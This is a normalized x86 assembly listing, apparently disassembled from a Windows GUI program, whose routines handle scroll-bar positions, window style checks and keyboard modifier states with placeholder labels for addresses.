add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_44c4e4
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_44c530
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_453088
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_4534f8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407b04
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_453074
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4534e4
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407b04
test eax eax
je r-xdata
sub_44c5b0
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44c604
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44c640
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_44c68c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44c6ea
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_449904
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404060
mov eax [ ebp - 0x8 ]
pop edx
call sub_407b04
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c6f1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
sub_44c6fc
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_44c724
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_44c795
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44c6fc
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c79c
lea eax [ ebp - 0xc ]
call sub_403e78
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4038b4
sub_44c7a4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_44c834
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413e74
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_44d0fc
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_44d0dc
mov edx [ edi + 0xc ]
mov eax ebx
call sub_44cf8c
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44c884
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44ca3c
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43521c
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_44cf8c
xor edx edx
mov eax ebx
call sub_44cf8c
jmp r-xdata
sub_44c8bc
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4233b8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_44c928
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4233b8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_44c990
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_44d0c4
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4380c0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_44d0c4
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_438084
call sub_44c928
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_438084
call sub_44c8bc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_44ca3c
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_43b390
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44ca74
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43b390
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_44caa8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44ca74
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44ca74
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_44cb24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43b390
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_44caa8
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4345b8
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_44caa8
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4345fc
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_44cbbc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43b390
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_44cc1c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_44cded ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44cb24
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44cb24
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44cf8c
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
push ebp
call sub_44cbbc
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
push ebp
call sub_44cbbc
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406820
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44cf8c
jmp r-xdata
sub_44cf14
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_44d604
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_44cf8c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_43b390
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_43b390
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_43af48
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_43af48
jmp r-xdata
call sub_44c6fc
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44d050
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_44d604
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_44d108
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b390
push eax
call sub_425c50
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b390
push eax
call sub_425c50
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b390
push eax
call sub_425c50
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41c09c
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b390
push eax
call sub_425c50
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b390
push eax
call sub_425c50
sub_44d210
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44cb24
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44cb24
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_44d108
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b390
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_44cf8c
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_44cb24
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_44d328
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4370bc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c7a4
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c7a4
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_44d3a0
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403128
mov eax [ esi + 0x20c ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4371e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_44d3ec
push ebx
mov ebx eax
mov eax ebx
call sub_438348
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_44d604
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40bb34
test al al
jne r-xdata
mov eax ebx
call sub_43b390
push eax
call sub_425c84
sub_44d42c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d584
mov ecx edi
mov edx esi
mov eax ebx
call sub_437a90
pop edi
pop esi
pop ebx
retn
sub_44d46c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44d574
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4345b8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_44ca3c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_4380c0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_44cf8c
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_438084
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_438084
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_41375c
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_434324
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d57b
mov eax [ ebp - 0x10 ]
call sub_403128
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44c884
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4138b8
xor ecx ecx
mov edx 0xb03e
call sub_435d5c
inc ebx
dec esi
jne r-xdata
sub_44d5a8
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_44d0dc
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_44d0dc
mov eax ebx
call sub_44d584
jmp r-xdata
sub_44d604
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43b694
test al al
je r-xdata
xor eax eax
push ebp
push sub_44d6ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
